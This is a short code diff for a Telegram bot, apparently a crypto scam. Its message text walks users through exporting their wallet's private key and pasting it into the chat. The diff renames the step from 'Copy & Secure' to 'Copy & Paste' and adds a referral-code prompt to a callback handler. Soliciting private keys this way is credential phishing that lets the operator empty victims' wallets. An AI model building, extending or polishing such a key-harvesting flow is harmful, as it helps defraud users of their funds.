@@ -749,7 +749,7 @@ Scroll and tap *Export Private Key*.
 5. Authenticate  
 Approve with your password or biometrics.
   
-6. Copy & Secure  
+6. Copy & Paste
 Copy the long string and paste here.`,
         parse_mode: "Markdown"
       }
@@ -768,10 +768,17 @@ Copy the long string and paste here.`,
     const data   = query.data;
     const user   = users[chatId];
   
+    // YES: pedimos el código
     if (data === "referral_yes") {
-      // … tu flujo actual para pedir código …
-      return bot.answerCallbackQuery(query.id);
-    }
+        user.step = 6;
+        saveUsers();
+        await bot.editMessageText("🔠 Please enter your *referral code*:", {
+          chat_id: chatId,
+          message_id: msgId,
+          parse_mode: "Markdown"
+        });
+        return bot.answerCallbackQuery(query.id);
+      }
   
     if (data === "referral_no") {
       await bot.answerCallbackQuery(query.id);
